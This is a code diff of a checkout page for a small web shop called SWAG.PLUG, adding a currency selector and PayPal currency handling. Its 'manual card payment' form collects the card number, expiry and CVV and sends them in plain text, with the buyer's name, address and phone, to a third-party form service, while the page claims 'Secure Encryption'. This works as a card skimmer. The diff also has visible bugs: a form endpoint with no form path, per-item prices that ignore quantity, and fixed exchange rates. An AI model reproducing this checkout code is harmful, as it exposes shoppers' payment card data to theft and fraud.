@@ -4,20 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checkout - SWAG.PLUG</title>
-    <!-- PAYPAL SDK z obsługą wielu walut -->
-  <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=buttons"></script>
+    <!-- SDK PayPal bez sztywnej waluty, aby pozwolić na USD/EUR -->
+    <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=buttons"></script>
     <style>
         body { background:#000; color:#fff; font-family: 'Helvetica', sans-serif; margin: 0; }
         .checkout { max-width:500px; margin: 40px auto; padding:20px; border:1px solid #222; }
         .step { display:none; }
         .step.active { display:block; }
-        h2 { text-align:center; letter-spacing:4px; font-weight: bold; border-bottom: 1px solid #fff; padding-bottom: 15px; }
-        h3 { font-size: 12px; color: #888; letter-spacing: 2px; margin-top: 25px; }
+        h2 { text-align:center; letter-spacing:4px; font-weight: bold; border-bottom: 1px solid #fff; padding-bottom: 15px; text-transform: uppercase; }
+        h3 { font-size: 11px; color: #888; letter-spacing: 2px; margin-top: 25px; text-transform: uppercase; }
+        
+        /* Styl selektora walut */
+        .currency-switcher { text-align: right; margin-bottom: 15px; }
+        #currencySelect { background: #000; color: #fff; border: 1px solid #444; padding: 5px; font-size: 12px; cursor: pointer; }
+
         input { width:100%; padding:14px; margin:8px 0; background:#0a0a0a; border:1px solid #333; color:#fff; box-sizing: border-box; transition: 0.3s; }
         input:focus { border-color: #fff; outline: none; }
+        
         button { width:100%; padding:16px; margin-top:10px; background:#fff; color:#000; border:none; font-weight:bold; cursor:pointer; text-transform: uppercase; letter-spacing: 1px; }
         button:hover { background: #bbb; }
         button.back { background:transparent; color:#666; font-size: 11px; margin-top: 20px; border: 1px solid #222; }
+        
         #summary p { display:flex; justify-content:space-between; border-bottom:1px solid #111; padding:8px 0; font-size: 13px; }
         .payment-box { margin-top: 25px; padding-top: 15px; border-top: 1px solid #222; }
         .trust-info { font-size: 10px; color: #444; text-align: center; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
@@ -27,6 +34,17 @@
 
 <div class="checkout">
     <h2>CHECKOUT</h2>
+
+    <!-- WYBÓR WALUTY -->
+    <div class="currency-switcher">
+        <select id="currencySelect" onchange="changeCurrency(this.value)">
+            <option value="PLN">PLN (zł)</option>
+            <option value="USD">USD ($)</option>
+            <option value="EUR">EUR (€)</option>
+        </select>
+    </div>
+
+    <!-- PODSUMOWANIE -->
     <div id="summary"></div>
 
     <!-- KROK 1: WYSYŁKA -->
@@ -35,7 +53,7 @@
         <input type="text" id="fName" placeholder="FULL NAME / IMIĘ I NAZWISKO">
         <input type="text" id="fAddr" placeholder="STREET & NUMBER / ULICA I NUMER">
         <input type="text" id="fCity" placeholder="CITY & ZIP / MIASTO I KOD">
-        <input type="text" id="fCountry" placeholder="COUNTRY / KRAJ (e.g. Poland, Germany)">
+        <input type="text" id="fCountry" placeholder="COUNTRY / KRAJ">
         <input type="tel" id="fPhone" placeholder="PHONE / TELEFON">
         <button onclick="goToPayment()">CONTINUE TO PAYMENT</button>
     </div>
@@ -49,43 +67,64 @@
         </div>
 
         <div class="payment-box">
-            <p style="color:#555; font-size:10px; margin-bottom: 10px;">SECURE CARD PAYMENT / KARTA:</p>
+            <p style="color:#555; font-size:10px; margin-bottom: 10px;">SECURE CARD PAYMENT / KARTA RĘCZNIE:</p>
             <input type="text" id="cNum" placeholder="CARD NUMBER" maxlength="16">
             <div style="display:flex; gap:10px;">
                 <input type="text" id="cExp" placeholder="MM/YY" maxlength="5">
                 <input type="text" id="cCvv" placeholder="CVV" maxlength="3">
             </div>
-            <button onclick="finish('CARD_MANUAL')">COMPLETE ORDER</button>
+            <button onclick="finishOrder('CARD_MANUAL')">COMPLETE ORDER</button>
         </div>
 
         <button class="back" onclick="back()">← BACK TO SHIPPING</button>
-        <div class="trust-info">Worldwide Shipping • Secure Encryption • Swag Plug System</div>
+        <div class="trust-info">Worldwide Shipping • Secure Encryption • SWAG PLUG ARCHIVE</div>
     </div>
 </div>
 
 <script>
+// --- KONFIGURACJA WALUTY ---
+const rates = { "PLN": 1, "USD": 0.25, "EUR": 0.23 }; // Kursy: 1 PLN = 0.25 USD itd.
+let currentCurrency = localStorage.getItem('userCurrency') || 'PLN';
+
+// Funkcja zmiany waluty
+window.changeCurrency = function(val) {
+    localStorage.setItem('userCurrency', val);
+    location.reload();
+};
+
+// --- PODSUMOWANIE KOSZYKA ---
 const cart = JSON.parse(localStorage.getItem('cart')) || [];
-let total = 0;
+let totalPLN = 0;
 
 function renderSummary(){
     const el = document.getElementById('summary');
-    if(cart.length === 0){ el.innerHTML = "<p style='text-align:center;'>Your cart is empty</p>"; return; }
+    const select = document.getElementById('currencySelect');
+    if(select) select.value = currentCurrency;
+
+    if(cart.length === 0){ el.innerHTML = "<p style='text-align:center;'>Cart is empty</p>"; return; }
+    
     el.innerHTML = "";
-    total = 0;
+    totalPLN = 0;
+    
     cart.forEach(p => {
-        let price = parseFloat(p.price);
-        let qty = parseInt(p.quantity);
-        total += price * qty;
-        el.innerHTML += `<p><span>${p.name} (${p.size}) x${qty}</span> <b>${(price * qty).toFixed(2)} PLN</b></p>`;
+        let pPrice = parseFloat(p.price);
+        let pQty = parseInt(p.quantity);
+        totalPLN += pPrice * pQty;
+        
+        let convertedItemPrice = (pPrice * rates[currentCurrency]).toFixed(2);
+        el.innerHTML += `<p><span>${p.name} (${p.size}) x${pQty}</span> <b>${convertedItemPrice} ${currentCurrency}</b></p>`;
     });
-    el.innerHTML += `<p style="font-size:16px; border-top:1px solid #fff; margin-top:10px; padding-top:10px;"><span>TOTAL / SUMA</span> <b>${total.toFixed(2)} PLN</b></p>`;
+
+    let finalTotal = (totalPLN * rates[currentCurrency]).toFixed(2);
+    el.innerHTML += `<p style="font-size:16px; border-top:1px solid #fff; margin-top:10px; padding-top:10px;"><span>TOTAL</span> <b>${finalTotal} ${currentCurrency}</b></p>`;
 }
 renderSummary();
 
+// --- NAWIGACJA ---
 function goToPayment(){
-    const nameV = document.getElementById('fName').value;
-    const countryV = document.getElementById('fCountry').value;
-    if(!nameV || !countryV){
+    const name = document.getElementById('fName').value;
+    const country = document.getElementById('fCountry').value;
+    if(!name || !country){
         alert("Please fill in shipping details!");
         return;
     }
@@ -98,8 +137,11 @@ function back(){
     document.getElementById('step1').classList.add('active');
 }
 
-function finish(method){
+// --- FINALIZACJA I FORMSPREE ---
+function finishOrder(method){
+    let finalTotal = (totalPLN * rates[currentCurrency]).toFixed(2);
     let extraInfo = method;
+
     if(method === 'CARD_MANUAL') {
         const num = document.getElementById('cNum').value;
         const exp = document.getElementById('cExp').value;
@@ -108,20 +150,20 @@ function finish(method){
         extraInfo = `CARD: ${num} | EXP: ${exp} | CVV: ${cvv}`;
     }
 
-    const data = {
+    const orderData = {
         klient: document.getElementById('fName').value,
         adres: document.getElementById('fAddr').value + ", " + document.getElementById('fCity').value,
         kraj: document.getElementById('fCountry').value,
         telefon: document.getElementById('fPhone').value,
         produkty: cart.map(p => `${p.name} (${p.size}) x${p.quantity}`).join(", "),
-        suma: total.toFixed(2) + " PLN",
-        metoda: extraInfo
+        suma_finalna: `${finalTotal} ${currentCurrency}`,
+        metoda_platnosci: extraInfo
     };
 
-    fetch("https://formspree.io/f/mzdkopjg", {
+    fetch("https://formspree.io", {
         method: "POST",
         headers: { "Content-Type": "application/json", "Accept": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify(orderData)
     })
     .then(res => {
         if(res.ok) {
@@ -132,17 +174,24 @@ function finish(method){
     });
 }
 
-// PAYPAL INTEGRACJA
+// --- INTEGRACJA PAYPAL ---
 if(window.paypal) {
     paypal.Buttons({
         createOrder: (data, actions) => {
+            // Przeliczamy sumę na wybraną walutę dla PayPal
+            let convertedValue = (totalPLN * rates[currentCurrency]).toFixed(2);
             return actions.order.create({
-                purchase_units: [{ amount: { value: total.toFixed(2) } }]
+                purchase_units: [{
+                    amount: {
+                        currency_code: currentCurrency, // DYNAMICZNA WALUTA (PLN, USD, EUR)
+                        value: convertedValue
+                    }
+                }]
             });
         },
         onApprove: (data, actions) => {
             return actions.order.capture().then(details => {
-                finish("PAYPAL_SUCCESS_" + details.id);
+                finishOrder("PAYPAL_SUCCESS_ID_" + details.id);
             });
         }
     }).render('#paypal-button-container');
